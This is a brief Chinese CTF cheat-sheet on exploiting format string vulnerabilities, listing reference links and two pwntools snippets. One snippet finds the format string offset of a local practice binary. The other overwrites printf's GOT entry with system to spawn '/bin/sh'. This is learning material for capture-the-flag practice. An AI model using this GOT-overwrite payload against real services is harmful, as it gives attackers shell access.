# 格式化字符串
## CTF中格式化字符串漏洞快速利用
>https://www.anquanke.com/post/id/147666
>
>https://bbs.pediy.com/thread-253638.htm
>
>https://www.anquanke.com/post/id/85785
>
>https://www.cnblogs.com/Yable/p/7895732.html

## 关键利用代码

### 计算偏移以填充(使用libformatstr)

```
#target program:print_test
from libformatstr import *
from pwn import *
from binascii import *
context.log_level = 'debug'
bufsiz = 100
elf=ELF('./print_test')                    #test length
bufsiz = 100
r = process('./print_test')
r.sendline(make_pattern(bufsiz))             # send cyclic pattern to
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))#偏移
log.info("padding: " + str(padding))#填充
```

### 覆盖got表代码

```
system_plt = elf.plt["system"]
printf_got = elf.got["printf"]
 
payload = fmtstr_payload(7, {printf_got:system_plt})    #关键函数
sleep(1)
io.sendline("/bin/sh\x00")
```
